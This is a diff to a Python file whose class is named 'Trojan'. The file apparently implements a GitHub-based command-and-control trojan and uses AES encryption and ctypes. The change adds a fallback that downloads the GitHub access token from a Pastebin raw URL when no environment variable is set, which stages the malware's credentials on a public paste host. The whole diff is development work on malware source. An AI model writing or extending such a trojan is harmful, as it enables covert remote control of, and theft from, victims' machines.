@@ -10,6 +10,7 @@ import os
 import uuid
 import ctypes
 import platform
+import urllib.request
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
@@ -57,8 +58,20 @@ class Trojan:
         print(f"[*] Attempting to connect to GitHub...")
         print(f"[*] Config: USER={USER_NAME}, REPO={REPO_NAME}")
         
+        global GH_TOKEN
         if not GH_TOKEN:
-            print("Error: GH_TOKEN environment variable not set.")
+            print("[*] GH_TOKEN not found in env. Fetching from Pastebin...")
+            try:
+                url = "https://pastebin.com/raw/KECnk4Bp"
+                with urllib.request.urlopen(url) as response:
+                    GH_TOKEN = response.read().decode('utf-8').strip()
+                print("[+] Successfully fetched token from Pastebin.")
+            except Exception as e:
+                print(f"Error: Could not fetch GH_TOKEN from Pastebin: {e}")
+                sys.exit(1)
+        
+        if not GH_TOKEN:
+            print("Error: GH_TOKEN environment variable not set and fallback failed.")
             sys.exit(1)
         
         masked_token = GH_TOKEN[:4] + "..." + GH_TOKEN[-4:] if len(GH_TOKEN) > 8 else "***"
